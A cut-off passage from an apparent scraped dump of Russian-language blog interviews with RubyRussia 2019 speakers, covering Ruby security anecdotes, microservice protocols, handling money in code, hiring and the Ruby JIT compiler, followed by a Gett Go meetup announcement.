Rails, в самом языке, в его runtime, в стандартной библиотеке или в Rails как фреймворке, который использует Ruby?\n\r\nЯ бы сказал, что больше всего уязвимостей находится на стыке между логикой приложения и самими Rails или другими библиотечными функциями.\n\nЗа последние несколько лет какая была самая смешная уязвимость, которую ты или твои коллеги находили? Из серии «Ааа, ну это ж надо было так облажаться».\n\r\nСамая запоминающаяся уязвимость была в геме, позволяющим озвучивать тексты. Ты ему передаешь текст, и он его озвучивает. Гем вызывал консольную утилиту и передавал ей параметры без должного экранирования. В результате обнаружилась инъекция в Bash, и можно было услышать результат выполнения произвольной команды. Ты передаешь на вход команду «ls /», а голос в ответ диктует «slash dev slash etc» и так далее.\n\nПоследние несколько лет экосистема языков сверхвысокого уровня – Python, Ruby, JavaScript – опирается на огромное количество маленьких библиотек. Их много, и они зависят друг от друга так, что убери какой-нибудь pad-left, и это убивает экосистему. Злоумышленники начинают либо делать свои библиотеки, либо брать контроль над чужими и добавлять в них какой-нибудь вредоносный код, который не найдешь. Насколько это сейчас большая и страшная проблема? \n\r\nПроблема есть, но пока о ней никто особо не думает, все полагаются «на авось». Если у злоумышленника есть цель атаковать конкретную компанию и определенным способом, то его сегодня никто не остановит. Ничто не мешает сделать просто хороший гем, набрать много звезд на GitHub и дождаться, пока все начнут его использовать. Затем скрытно встроить в него вредоносный код, что совсем не сложно. Думаю, вопрос зависимостей сегодня – это вопрос доверия: проблема открыта и ещё только ждет своего решения.\n\nУвидимся на RubyRussia! \n\r\nВопросы на тему безопасности можно будет задать Михаилу после доклада, а так же обсудить на стенде его компании. Посмотреть на то, какие еще темы будут обсуждать рубисты 28 сентября можно на сайте.\n\r\nА кроме спикеров и участников, можно познакомиться и с замечательными компаниями, которые поддерживают конференцию:\n\r\nОрганизатор — Evrone\r\nГенеральный партнер — Toptal\r\nЗолотой партнер — Gett\r\nСеребряные партнеры — Валарм, JetBrains, Bookmate и Cashwagon\r\nБронзовый партнер — InSales", {"day": "13", "month": "сентября", "time": "16:45"}, {"rate": 8, "views": 2000}], ["28 сентября на конференции RubyRussia DevRel компании Evrone Григорий Петров расскажет о том, как общаются микросервисы. В сегодняшнем интервью Иван Соловьев поговорил с Григорием о теме его предстоящего выступления и не только об этом.\n\n\n\nРасскажи о себе, чем ты занимаешься в Evrone?\n\r\nЯ занимаюсь developer relations — это что-то среднее между DevRel и Technology Evangelist, разработчик, который умеет выступать на конференциях. Работа как у Робин Гуда: общаться с командами разработки внутри компании, собирать разное интересное из того, чем они занимаются, и рассказывать об этом на конференциях. Ruby Russia будет одна из первых конференций, где я буду выступать от лица компании.\n\nЗнаю тебя как одного из организаторов различных Python конференций. Расскажи, как ты пришел в мир Ruby?\n\r\nЯ никогда не уходил из мира Ruby. Один из первых моих докладов это «Python vs Ruby». Много лет назад, когда я писал на С++, мне понадобились высокоуровневые механизмы автоматизации всякого тестирования, генерации документации. Тогда я писал и на Python, и на Ruby, и немножко на PHP. Искал лучшие способы решения задач, которые у меня были.\n\nНасколько твой доклад будет заимствован у команд разработки внутри компании? Я знаю, ты на многих языка писал: Ruby, Python, PHP, TypeScript, JavaScript, C++ и не только.\n\r\nДоклад будет про общение микросервисов между собой по сети, используемые для этого протоколы и возникающие сложности. На самом деле, у меня долгие отношения с сеткой. Я делал Radmin, это сетевая тулза для удаленного управления. Проект NPTV (в котором я тоже работал DevRel) — это интерактивное телевидение, которое активно использовало сетку и управлялось на Ruby. Voximplant (где я снова занимался DevRel) — это программируемая телефония, где я познакомился с VoIP. Сетка мне очень близка. Я мог бы сделать доклад, основываясь на своем опыте, но так я бы принес не максимальную ценность гостям конференции, а я хочу нести максимум пользы. На этапе начальной подготовке доклада я проинтервьюировал несколько команд Evrone. Компания занимается заказной разработкой сложного и качественного софта, много команд работает над разными проектами. Мы созванивались в Zoom и общались по часу и больше. Обсуждали, что и как делают, какие сложности, какие стеки используют. Мой доклад будет наполовину про сетку, сетевые протоколы, сложности и прикладное, и наполовину о том, как оно используется в Ruby разными командами.\n\nУ тебя большой багаж общения с разработчиками. Насколько ты считаешь работа с сетью в Ruby специфична? \n\r\nСеть складывается из нескольких частей. В первую очередь — работа языка программирования и его экосистемы непосредственно с байтами, передаваемые по сети. Самый низкоуровневый сетевой стек. Например, тот же JS и Node используют libuv, асинхронную модель. Есть главный поток, и ты работаешь с сетью событийно. У тебя для этого есть корутины. Ты делаешь много ожиданий, делаешь ожидание для того, чтобы принять данные, делаешь ожидание для того, чтобы данные отправились. Этот один поток обеспечивает тысячи и десятки тысяч запросов в секунду. \n\r\nНа этом фундаменте развиваются фреймворки, какими бы они ни были. Например, у JS нет серьезных фреймворков для работы с сеткой (с чем его и можно поздравить!). За исключением express.js, который трудно назвать полноценным фреймворком. Python перешел на похожую модель, а самый популярный фреймворк Django остался на предыдущей модели. Сейчас там некий раздрай — синхронный фреймворк, который пытается размножаться блокирующими потоками, процессами, с нависающим над этим GIL, а сбоку какие-то новые штуки, которые пытаются работать по асинхронной модели, например Django Channels. Ruby пока остается в синхронной модели и размножается процессами. Поэтому здесь соответствующая экосистема, подходы и очень сильные позиции Rails.\n\r\nВ чем сила Ruby? Прежде всего в DSL, Domain specific language. Когда мы говорим про сетку, Ruby лучше всего играет на том поле, где он сильнее всего. Когда мы используем GraphQL, это значит, что библиотеки для использования GraphQL есть везде. В Ruby они будут использовать очень хороший DSL синтаксис для задания схемы. И интеграцию между этими DSL синтаксисом и DSL синтаксисам ORM в ActiveRecord. Именно этого мы можем ожидать от Ruby. При этом у нас не будет никаких асинхронных операций (await’ов), мы будем масштабироваться процессами и у нас будут соответствующие требования к серверам.\n\nУ тебя в докладе заявлено несколько протоколов взаимодействия. Тот же JSON:API и так далее. В какую сторону ты видишь дальнейшее развитие, не скатимся ли мы все в GraphQL?\n\r\nОчень резонансный вопрос. На мой взгляд, это началось с того, что сетка медленная. Приложения в начале просты. Как правило все приложения, и Ruby, и Python, и Node, используют обычные HTTP endpoint’ы для общения. Внутри используют какой-то payload. Раньше XML, сейчас JSON. У них все хорошо первые несколько месяцев или лет, кому как повезет. Дальше бизнес начинает задавать сложные вопросы. Например, нужно получить каких-то пользователей, и для каждого пользователя получить список компаний, в которых он работает. Тут возникает проблема: если использовать просто endpoint, то это будет несколько десятков или сотен запросов, а сетка неторопливая: запрос, ответ, потерянные пакеты. Это будет чудовищно медленно и много данных надо будет передать по сети. В 100 раз больше, чем нужные данные. Наша система коллапсирует, как коллапсируют под такими запросами крупные системы бизнес автоматизаци, которые лет через 10 вырастают в монстров, где сложный вопрос из интерфейса может выполнятся минуты, часы. Все это время база на backend будет отрабатывать кучу одинаковых запросов, и по сети будет гнаться куча одинаковых запросов. Мы пытаемся решить это разными способами.\n\nПриведи реальные примеры таких проблем?\n\r\nОсобенно отличился Facebook, у них эта проблема стоит очень остро: есть много данных, по которым они любят делать сложные запросы. Например: покажи мне тех, кто оставил комментарии к этому сообщению, и их друзей. Чтобы не делать миллионы запросов, фейсбук использует разные варианты. Например, FQL, Facebook Query Language. Собрав всю свою экспертизу они сделали GraphQL — штуку, которая позволяет делать SQL-подобные запросы на клиенте. Но это не SQL, потому что нам нельзя привязываться к базам данных, а запрос в терминах backend API. Отправляешь один запрос и получаешь один (или как там получится) ответ.\n\r\nВторая большая проблема — что делать, если мы хотим получить много данных с бэкэнда. Например, пять тысяч пользователей или лог в 10мб. Страшно делать это все одним http запросом-ответом. Потому что если сеточка сколлапсирует, запрос придется повторять целиком, а это может длиться вечно. Возвращаюсь к фейсбуку: они сделали GraphQL, костыль над сеткой. А потом другие люди сделали HTTP/2, который решает проблему с сеткой. HTTP/2 делает одно асинхронное соединение, в рамках которого мы можем делать много мелких запросов. HTTP/2 борется с GraphQL, если у GraphQL сервера нет особенной магии, чтобы оптимизировать количество запросов к базе на backend. И в докладе мы поговорим о том, что же Ruby предлагает для этой магии. При наличии HTTP/2 GraphQL может быть не нужен. Мы можем сделать 100 запросов по HTTP/2 к нашему endpoint’у, и с точки зрения байтиков это будет не больший оверхед, чем если мы используем GraphQL. Google Protocol Buffers и gRPC подходят к этой проблеме с третьего конца. Используют бинарные транспортные протоколы, в основном HTTP/2, предлагают некую схему для api. Тут они конкурируют с обычным REST. \n\r\nНа практике, в большинстве компаний, которые используют JSON, сидит программист Вася, который пишет этот JSON руками. Через полгода Вася узнает, что дату и время можно передать сотней разных способов. Начинается ужас! Но если в компании сидят хорошие разработчики, они пишут не просто JSON, а используют какой-нибудь стандарт. Используют OpenAPI или JSON Schema, все эти интересные штуки, которые конкурируют с gRPC. Весь этот современный зоопарк решает несколько озвученных проблем. А что с этим зоопарком случится в будущем, я совсем не могу предсказать. Но приглашаю разработчиков прийти и обсудить этот вопрос: что же нас ждет в ближайший год, 3, 5, 10 и какова диспозиция сил сейчас.\n\nДавай поговорим про будущее Ruby как языка программирования?\n\r\nТрудно предсказать будущее. Мне бы очень хотелось, чтобы в Ruby доехали хорошие типы. Ruby 3 сейчас на самой начальной стадии внедрения типов. Мне бы хотелось, чтобы этот синтаксис был красивым. Я видел пропозалы, у меня от них лысина дыбом встала. Ужасный, очень многословный синтаксис, который никто не будет использовать.\n\nПочему ты так считаешь?\n\r\nЯ нейрофизиолог-любитель. Интуитивное мышление, которое у всех есть, любит принимать всякие странные решения. Если, например, надо написать много букв, то это плохо. Эти типы могут быть мега-клевыми, но из-за того, что придется писать в полтора раза больше кода, мы будем чувствовать эмоцию «не хочу». А мы очень чувствительны к нашим эмоциям, поэтому никто не будет этим пользоваться. Мне очень нравится, как донесли типы в Python и TypeScript: через двоеточие. Это дает минимальный оверхед. Мы написали идентификатор — посмотрели. Я точно знаю, что здесь будет число, надо поставить капкан. Разработчик пишет двоеточие и все, капкан установлен. Через пару недель, когда совершенно в другом месте он нечаянно передаст туда список или строку, капкан сработает и сэкономит разработчику несколько часов или недель отладки. \n\nЧто бы ты еще хотел увидеть в Ruby?\n\r\nПоследние несколько лет я вижу много async с корутинами. Мне это очень нравится, потому что async код с корутинами просто читать. Он понятный, позволяет запихнуть сложные штуки в простой синтаксис. Это неплохо реализовано в последнем Python и неплохо реализовано в JavaScript. Мне бы очень хотелось, чтобы и в Ruby завезли что-то такое… Собственно говоря, в Rubу есть файберы. Круто было бы добавить что-то вроде Node, чтобы можно было писать асинхронные Ruby-приложения, используя файберы или какие-то другие примитивы. А под капотом оно само использовало бы libuv или еще какие-то примитивы операционной системы для работы с сеткой. \n\r\nИли раскладывало бы что-то по потокам. Использовало бы что-то для того, чтобы конкурентно выполнять все эти сетевые запросы, запросы к базам, запросы к файловой системе. А я бы только на уровне корутин писал маленькие кусочки кода, которые выполняются по входящему запросу или таймеру, далее отдавали команды и ждали их выполнения. Далее под капотом много магии, все это выполняется параллельно, сжирает огромную амазоновскую тачку на 100% и имеет десятки тысяч запросов в секунду. В случае Go сотни тысяч запросов в секунду.\n\nВернемся к типам. Это, наверное, будет постепенное внедрение типов, Gradual Typing?\n\r\nGradual Typing — мега взлетевшая штука, которую впервые добавили в Python. Сделали так, что типы можно добавлять по чуть-чуть. На мой взгляд, возникла целая парадигма разработки, когда в начале код очень быстро пишется без типов, а затем, когда разработчик видит, что какая-то часть кода стабилизировалась, именно в эту часть кода начинают добавлять типы. Именно там, где оно стабилизировалось и надо ставить капканы, чтобы в будущем об это стабилизированое ничего не ломать. Будет круто, если для Ruby сделают что-то похожее.\n\nКакой вопрос ты хочешь задать Yukihiro Matsumoto на конференции?\n\r\nЯ уже 4 года изучаю японский, и моего японского наверное хватит чтобы сказать ему «спасибо». Я буду тренироваться!\n\nУвидимся на RubyRussia! \n\nРегистрируйтесь, следующее повышение цены ожидается после 15 сентября, 700 участников уже с нами.\n\r\nИ традиционное спасибо компаниям, которые нас поддерживают:\n\r\nОрганизатор — Evrone\r\nГенеральный партнер — Toptal\r\nЗолотой партнер — Gett\r\nСеребярные партнеры — JetBrains, Bookmate и Cashwagon\r\nБронзовый партнер — InSales", {"day": "11", "month": "сентября", "time": "13:48"}, {"rate": 10, "views": 2800}], ["Привет!\n\r\nМы готовимся к предстоящей конференции RubyRussia 2019 (вы уже отметили в календаре 28 сентября?) и беседуем с нашими спикерами о жизни, комьюнити и программировании. В сегодняшнем интервью Феликс Яснопольский из Evrone общается с Иваном Шаматовым: лидером Saint P Ruby Community (тут можно присоединиться к уютному чату сообщества в Telegram) и VP of engineering в Cybergizer.\n\n\n\nО чем будет твое выступление на предстоящей конференции? \n\r\nЯ хочу показать, что деньги в программировании — это просто! С помощью денег мы выражаем некоторую стоимость товара или услуги. В общем случае их можно описать как кортеж размерностью 2, состоящий из значения цифрового (например 100) и символьного (например USD,$). В случае операций с деньгами с одинаковыми символами математической аппарат относительно прост, но даже тут можно обнаружить подводные камни. Что уж говорить про сценарий конвертирования денег из одной валюты в другую. Тут идеальный математический мир рушится и начинается бизнесово-бухгалтерский. Я покажу, как разобраться в некоторых сценариях и какие могут быть ошибки на примерах практик из финтех-проектов. \n\nПочему ты выбрал эту тему?\n\r\nЯ участвовал в разработке системы платежей для метрополитена, аэроэкспресса, системы для оплаты коммунальных счетов для некоторых штатов в США и много других. Самый первый скрипт, который я написал за деньги — скрипт на php для оплаты интернета через терминалы в Пушкине. В следующий раз я столкнулся с темой денег, когда работал в Cryptopay — там тоже были переводы и транзакции. Потом я ушел работать в Toptal, где был частью команды, занимавшейся биллингом. Готовясь к конференции, я подумал, что многие могут рассказать об особенностях Ruby, но мало кто разбирается в том, как же написать деньги и как сделать это правильно. А это тема, с которой мы часто сталкиваемся в самых разных проектах.\n\nКакие технологии, кроме Ruby, тебе симпатичны? \n\r\nМне очень нравится JavaScript. Получаю удовольствие от легкости написания на ES6. Нравятся парадигмы, которые приходят в Ruby из других языков: в этом случае нам становится не обязательно использовать эти самые другие языки. Можно открыть concurrent gem и увидеть кучу инструментов из Go, Clojure, Java и JavaScript. Мне нравится, что в разных языках необходимо использовать разные способы мышления. Есть люди, которые переходя с Ruby на Go сохраняют принципы Ruby-мышления. Или приходят в Ruby с принципами из PHP. В программировании так не работает: у каждого языка свой подход, свой воркфлоу, свой mindset. Нужно понимать, как правильно писать программы именно в рамках конкретной технологии. \n\r\nМне очень интересна мобильная разработка: те же паттерны, тот же MVC, но все работает совсем по-другому. Очень интересно было изучать React и Redux — отличная репочесалка для типичного рельсовика :)\n\nРасскажи о своих самых больших провалах и поводах для гордости.\n\r\nЯ могу гордиться проектами, в которых участвовал, к которым приложил руку. Например, проект, который дает возможность оплатить paypass картой аэроэкспресс в Москве. Эта же система используется в метрополитене Казани. Я писал и клиент для турникетов на JRuby, и бэкенд на Rails, который обслуживает эти транспортные транзакции, работает с различными API. Это был очень интересный проект, при этом в нем участвовало всего три разработчика. \n\r\nФакапов не стыжусь, даже когда они случаются. Человек имеет право на ошибку. Ошибся — и больше так не делаешь.\n\nОдно из твоих занятий — менторство. Почему ты занимаешься этим?\n\r\nУ меня самого всегда были менторы, которые подсказывали, что и как делать. Это ребята из разных чатов, люди, с которыми я общался на конференциях и митапах. Когда я достиг определенного уровня, сам стал менторить как офлайн, так и онлайн. Сейчас я занимаюсь с людьми, которые пришли к нам из Rubizz’ы. Это один из моих основных проектов на сегодняшний день, интенсивное практическое изучение Ruby для новичков. Ребятам предоставляется максимальная свобода действий и право на ошибку. И только после того, как шишки набиты, ментор объясняет, почему это была ошибка и почему так делать не стоит. Я считаю, что это правильный подход: какие-то вещи нельзя понять, пока не соберешь эти грабли сам. Если ты никогда не использовал коллбеки неправильно, то не поймешь, в чем может быть проблема с ними. И почему многие в сообществе ненавидят коллбеки.\n\nЯ слышал, что ты пытался попасть в команду Toptal шесть или семь раз. Это правда? \n\r\nДа, это правда, я много раз об этом рассказывал. Toptal вел агрессивную, или правильнее сказать, проактивную политику по найму с момента старта компании. Меня приглашали на собеседования где-то раз в год. После многократных неудачных попыток я решил, что больше и не буду пытаться. Но мой приятель, с которым мы когда-то начинали наш путь в Ruby, устроился туда работать и предложил мне попробовать еще раз. И в этот раз я таки смог пройти все этапы собеседования. На входе есть большой технический тест, потом собеседование, потом еще одно, и еще… И теперь я считаю, что проводить по 5–6 этапов собеседований — это очень крутая практика. Только так ты можешь понять кто перед тобой, хочешь ли ты работать с этим человеком, впишется ли он в команду. И я понимаю, почему меня не брали в первые разы, я и правда тогда не тянул. \n\nКак, на твой взгляд, должно быть устроено идеальное собеседование и процесс приема на работу?\n\r\nКогда я помогал с отбором людей в предыдущую команду, Cryptopay, у нас было два этапа. В качестве тестового задания мы давали кусок кода на рефакторинг. По этому фрагменту кода мы делали предварительную оценку кандидата. Потом проводили собеседование в формате лайвкодинга, чтобы понять, подходит ли этот человек именно нам. Лайвкодинг позволяет понять, как человек думает. Можно оценить не только то, что написано, но и то, как разработчик пользуется операционной системой, IDE, знает ли хоткеи, насколько глубоко понимает определенные темы, какие применяет подходы, какие вопросы задает коллегам в процессе. Такой подход дает намного больше информации о человеке, чем тест или интервью об алгоритмах.\n\r\nНо я считаю, что и этого недостаточно. Сейчас, в Cybergizer, я чаще всего нанимаю людей, с которыми уже работал. Есть люди, с которыми мы не работали, но вместе писали какой-то open source. Такая совместная деятельность позволяет увидеть, как человек пишет код. А еще ты понимаешь, насколько совпадает ваш воркфлоу, насколько вы ментально близки. \n\r\nЯ не считаю себя экспертом по найму, мой подход тоже дает осечки. Одна из моих недавних ошибок: я не хотел брать человека после лайвкодинг сессии на интервью, он меня не впечатлил. Но другие члены команды проголосовали за него, и мы стали работать вместе. И в совместной работе я понял, что это высококлассный специалист. Был и абсолютно противоположный случай, когда я всеми руками был за человека, а он как разработчик из себя ничего не представлял. После этих двух случаев я не готов судить о правильности какого-то конкретного способа найма. Может повезти, может не повезти. Перефразируя известную шутку:\r\n— Как вам удается нанимать таких хороших разработчиков?\r\n— Это всё опыт найма хороших разработчиков!\r\n— А как получить такой опыт?\r\n— Надо нанимать разных разработчиков.\n\r\nМне кажется странным то, что очень многие интересуются, как захантить хороших специалистов. Но мало кто интересуется, как стать такой компанией, в которой хорошие специалисты захотят работать. А может стоит думать в первую очередь об этом?\n\nТы организуешь в Питере митапы и конференцию Saint P Rubyconf. Почему и зачем ты это делаешь?\n\r\nЭто часть Ruby культуры — контрибьюшн в сообщество. Кто-то вкладывается кодом, пишет opensource. Я вношу вклад тем, что у меня получается. Многие думают, что для того, чтоб внести какую-то лепту, нужно быть семи пядей во лбу. Но это не так! Почти 10 лет назад, когда я был в самом начале пути в Ruby, я с командой ребят переводил на русский и озвучивал RailsCasts. Так что каждый может быть полезным всему сообществу: не важно, обновляешь ли доку в геме, пишешь статью или организуешь митап.\n\nУвидимся на RubyRussia 28 сентября! \n\r\nСмотрите программу и присоединяйтесь тут, следующее повышение цены ожидается после 15 сентября.\n\r\nСпасибо компаниям, которые нас поддерживают:\n\r\nОрганизатор — Evrone\r\nГенеральный партнер — Toptal\r\nЗолотой партнер — Gett\r\nСеребярные партнеры — JetBrains, Bookmate и Cashwagon\r\nБронзовый партнер — InSales", {"day": "10", "month": "сентября", "time": "13:49"}, {"rate": 5, "views": 2000}], ["Центральной российской Ruby конференции 28 сентября исполняется 10 лет. В этом году у RubyRussia новая площадка, целых 4 потока отборных докладов, общение и, конечно, легендарное афтепати! Среди спикеров Yukihiro Matsumoto, Takashi Kokubun, Xavier Noria, Nick Sutterer, Genadi Samokovarov и не только! \n\r\nВ рамках подготовки мы беседуем со спикерами о Ruby, работе и жизни. Сегодня публикуем материал, в котором Дмитрий Матвеев (project manager в Evrone) задает вопросы Takashi Kokubun. \n\n\nСпикер RubyRussia 2019, оптимизатор JIT-компилятора Ruby, поддерживает Haml и ERB, бэкэнд-инженер в ArmTreasure Data.\n\nРасскажи, о чем будет идти речь в твоем докладе на конференции?\n\r\nО работе над JIT-компилятором. Я хотел бы акцентировать внимание на трех моментах. Первый — это встраивания функции (functions inlining). Функция должна быть «чистой», без побочных эффектов, чтобы ее тело можно было бы заинлайнить. Если функций становится слишком много, компилятор начинает работать медленно. Я опишу, как можно решить эту проблему.\r\nВторой момент касается оптимизации размещения объектов в памяти. В таких больших и сложных приложениях, как Rails, нужно создавать много объектов за один запрос. Если оптимизировать этот процесс, то можно улучшить производительность. Обычно объекты создаются в «куче». Поэтому приходится управлять сложными структурами данных в ней. Также приходится вызывать сборщик мусора для удаления неиспользуемых объектов. А если бы мы размещали объекты в стеке, мы просто увеличивали бы указатель стека при добавлении объекта и уменьшали его, когда объект нужно удалить. Использование стека для хранения объектов быстрее само по себе, плюс сборщик мусора начинает работать быстрее. Но для того, чтобы использовать стек, нам нужно убедиться, что объекты не используются в других местах. Для этой цели мы применяем технику, которая называется «escape-анализ». Нам нужно проанализировать каждый метод и убедиться, что каждый его внутренний объект не используется снаружи и не возвращается как результат текущего метода. Если мы можем сделать это, мы можем разместить объекты в стеке, и это увеличит производительность. Моя идея состоит в том, чтобы добавить метаданные для инструкций. Сейчас это эксперимент, но я собираюсь сделать пулреквест в мастер с этим кодом в ближайшее время.\n\r\nТретий пункт касается оптимизации диспатчинга вызовов функций в JIT. В настоящее время этот процесс порождает сильное ветвление логики, что плохо влияет на механизм branch prediction процессора. Это замедляет работу процессора в целом. Нам нужно упростить эту логику, то есть уменьшить количество условий. В настоящее время я исследую, как это сделать. \n\nЭто хардкорный доклад с большим количеством кода и концепций! Кажется, будет сложно?\n\r\nДумаю, что большинство людей не реализуют компиляторы самостоятельно, и я понимаю, что разобраться в этом может быть сложно. Но я постараюсь объяснить все как можно проще на примерах и иллюстрациях. То есть, мой доклад должен быть понятен людям без специального опыта в разработке компиляторов.\n\nА можно ли использовать новый компилятор в продакшене уже сейчас, и в каких случаях?\n\r\nИдея заключается в том, чтобы заставить приложения RoR работать быстрее. Например, моя нынешняя компания выиграет от этого. Но я бы не сказал, что все уже готово для продакшена. Оказалось, что как раз RoR приложения не особо ускоряются. Это из за того, что такие приложения как правило большие, и генерируют много кода на C, что приводит к неэффективному использованию кеширования в процессоре. У меня есть кое-какие идеи о том, как это поправить. Как раз над этим я сейчас и работаю. Но уже сейчас мой компилятор может быть полезен для небольших приложений. Например, я знаю, что гем karafka работает быстрее с ним, чем без него.\n\nЯ читал, что JIT-компилятор уже влит в мастер бранч языка Ruby и доступен начиная с версии 2.6. Так ли это?\n\r\nДа, мой мердж реквест уже принят. Но это первая версия, и предстоит еще много работы. Улучшения будут уже в Ruby 2.7, а еще больше в Ruby 3.\n\nРасскажи, как ты начал писать на Ruby?\n\r\nСначала я работал с Objective-C, но он мне не очень нравился. Однажды появилась необходимость написать бекенд-приложение, и друзья порекомендовали попробовать Ruby On Rails. Я так и сделал — и остался очень доволен результатом! Понравился простой и понятный синтаксис языка, и я начал более глубоко изучать и использовать его.\n\nСейчас ты пишешь на Ruby на работе?\n\r\nЯ работаю в компании Treasure Data последние пару лет. Это платформа, которая отслеживает данные пользователей в клиентских приложениях. Изначально этот проект был написан на Ruby On Rails, и моя должность называлась «Ruby разработчик». Так что я много писал на Ruby. Но сейчас я работаю над некоторыми распределенными сервисами, написанными на Java и Kotlin, а также иногда использую Python.\n\nПроект Treasure Data связан с высокой нагрузкой и большими данными. Но Ruby не самый быстрый язык. Как удалось создать приложение с высокой нагрузкой, которое работает с большими данными на платформе RoR?\n\r\nПриложение записывает пользовательские данные и сохраняет их в хранилище. Оно также предоставляет интерфейс запросов к данным на языках наподобие Hive и Presto, и админку. Не было проблемой написать это все на рельсах. Плюс мы сделали грамотную инфраструктуру и имеем возможность увеличивать ресурсы по памяти и процессору при пиках нагрузки. Основная проблема, которая есть у нас с Ruby — это то, что он плохо подходит для параллельных вычислений. И нам приходится использовать Kotlin для этой цели.\n\nЗа что ты любишь Ruby? Если бы был проект, который можно реализовать как на Ruby, так и на Python, какой из них них ты бы выбрал?\n\r\nМне нравится чистый синтаксис Ruby, он очень удобочитаемый и интуитивно понятный. Это позволяет легко и быстро писать логику приложения, что важно с точки зрения бизнеса. Это чисто объектный язык, я это очень ценю. У меня есть опыт в Python, но он не кажется мне таким же интуитивным. Я выбрал бы его только для проектов, связанных с машинным обучением. \n\nЕще одна вещь, над которой ты работал в последнее время, — это шаблонизатор Haml...\n\r\nЯ работал над Haml и ERB на предыдущей работе. Сейчас не слишком много уделяю этому времени, но иногда просматриваю пулреквесты в этих проектах.\n\nЧто ты думаешь о перспективах шаблонизаторов, таких как Haml, Slim или ERB, в целом, с учетом того, что в современном мире есть тенденция полностью разделить бек и фронт на два разных приложения, и отдать формирование HTML страниц полностью на откуп JavaScript’у? То есть, в такой конфигурации, шаблонизаторы совсем становятся не нужны?\n\r\nЯ согласен с тем, что для задач со сложным пользовательским интерфейсом имеет смысл выносить эту логику в отдельное приложение. Это приходится делать, чтобы конкурировать с другими компаниями, которые все больше наращивают сложность и функционал UI. Но по-прежнему есть необходимость в более простых и, что важно, более дешевых решениях, которые имеет смысл писать на RoR с классическими шаблонизаторами. Таким образом, они по прежнему в строю и будут использоваться еще долгое время.\n\nЯ вижу, что ты умеешь программировать на многих языках, минимум на Ruby, Python, Java, Kotlin и C. Неплохой набор. Можешь дать совет для начинающих, как освоить столько языков? Как стать хорошим программистом?\n\r\nЯ думаю, что эффективность обучения будет высокой, когда язык подходит для тех задач, которые стоят перед программистом. Ruby хорош для написания веб-приложений, потому что работать со строками в нем очень легко по сравнению с Java. Python больше подходит для машинного обучения (для него создана богатая инфраструктура в этой области). Если вы хотите изучать Python, я бы рекомендовал решать задачи машинного обучения, а не писать веб-приложения. Если вас больше интересуют Java, Kotlin или другие языки на основе JVM, я предлагаю писать распределенные системы. Сейчас Ruby не очень хорошо подходит для ресурсоемких или параллельных вычислений. Для решения таких задач на Ruby нам нужно много процессов, которые потребляют много ресурсов, поэтому они не будут эффективными. Таким образом, использование подходящих инструментов для соответствующих проблем будет способствовать пониманию того, почему этот инструмент разработан таким образом. Это поможет лучше понять его суть.\n\nКакие книги стоят на вершине твоего личного «рейтинга»?\n\r\nПервая — «Ruby under a Microscope». Она написана очень просто и описывает детали интерпретатора. Глубокое понимание того, как работает интерпретатор, будет помогать при решении сложных задач, а также добавит уверенности во владении инструментом, т.е. языком. Я рекомендую эту ​​книгу даже для начинающих. \n\r\nВторая — «Readable Code». Она о том, как писать понятный код, как это ни странно :). Мы пишем много кода и читаем много кода, и мы должны уметь писать такой код, который будет понятен другими. А для этого нам надо взглянуть на код под углом чужого восприятия. Такие книги, как эта, помогают это сделать. Тоже рекомендую даже новичкам. Ну а третья книга… Это книга на японском языке, о том, как устроен процессор, об его архитектуре, вплоть до транзисторов, из которых он состоит. Понимание того, как работает компьютер, на столь низком уровне иногда бывает очень полезным даже при решении проблем на уровнях намного выше. Я рекомендую прочитать любую хорошую книгу об устройстве микропроцессора, даже если на первый взгляд это кажется неочевидным.\n\nЧто ты ожидаешь от России и конференции RubyRussia?\n\r\nЯ никогда раньше не был в России. Ожидаю, что увижу много всего красивого, например, красивые дома, красивые пейзажи… Кроме того, в России должно быть холоднее, чем в Японии. Мне будет интересно самому увидеть и почувствовать все эти различия между нашими странами.\n\nКруто! Могу заверить, что даже если и будет холодно (на самом деле, в конце сентября не так уж и холодно у нас), конференция и after-party в любом случае будет горячей!\n\r\nВас тоже ждем на конференции! Задать свои вопросы лично (и на легендарном афтепати :) можно будет 28 сентября. Программа тут, а билет сейчас стоит 9000 рублей.\n\r\nСпасибо компаниям, которые поддерживают RubyRussia:\n\r\nОрганизатор — Evrone\r\nГенеральный партнер — Toptal\r\nЗолотой партнер — Gett\r\nСеребярные партнеры — JetBrains и Bookmate\r\nБронзовый партнер — InSales", {"day": "5", "month": "сентября", "time": "14:29"}, {"rate": 22, "views": 2700}], ["Всем привет, меня зовут Антон Тупиков, я – тимлид команды B2B Development в Gett. \n\r\nGett – не просто сервис такси, а динамический маркетплейс. Это высоконагруженная система: десятки тысяч водителей и миллионы клиентов в 120 городах по всему миру пользуются сервисами Gett каждый день. \n\r\nРазвиваясь изначально как B2C приложение, Gett в последние 6 лет запускал несколько «стартапов внутри стартапа”. Это были эксперименты с доставкой, маршрутками и корпоративными продажами. Многие из них позже вылились в успешные направления бизнеса. Например, B2B решение успешно работает для более чем 15 000 крупных корпораций, среди которых такие бренды как Google, Visa, Gucci, LVMH, Nestle и др.\n\r\nБлижайшая важная задача, которая стоит перед Gett – это выход на IPO в следующем году. Мы рассчитываем, что продукт нового поколения поможет нашему IPO стать успешным, и именно поэтому было принято решение объединить усилия лучших инженеров Gett и Juno для достижении этой цели. Речь идет о разработке инновационных продуктовых решений с нуля c использованием самого современного технологического стека. \n\r\nХочу пригласить всех желающих на митап в Минске, который пройдет 12 сентября при поддержке GoWay-комьюнити, где мои коллеги разработчики расскажут о технических челенджах, с которыми они сталкиваются ежедневно и немного о том, с чем нам предстоит столкнуться в перспективе работы над новыми решениями.\n\n\n\n\n\r\nНа митапе спикеры расскажут о том, какие технические челенджи решаются в Gett при помощи языка Go.\r\nСпикеры:\n\n\nСаша Грунин, Gett, Senior backend engineer at B2B Development team – История разработки на Go в Gett 2018-2019.\n\r\nGett — классическая история, когда после нескольких лет разработки монолита, оказалось более целесообразно разделить монолит на сервисы, чем рефакторить его. Переход на Go – не одномоментный процесс: вместе с эволюцией технологий эволюционировали и процессы вокруг.\r\nВ этом докладе Саша расскажет про то, как в компании развивалась разработка на Go и как устроены процессы и технологии разработки сейчас.\n\nSagi Kritchbets, Gett, Senior backend engineer at Pricing Team – State of the art engineering (доклад на английском языке)\n\r\nIn Gett much of the functionality is location based. During each order there is a need to retrieve configuration data based on GPS locations. Geo services are handling large number of requests and are on critical path of the business flow. It is required that the service will respond quickly and will be scalable. Legacy area service in Gett was fully based on PostGIS, which lead to bottleneck on DB. Sagi are going to talk about new area service and its in memory distributed geographic cache implementation based on hex grid and redis pubsub. Sagi will go through basic geometry 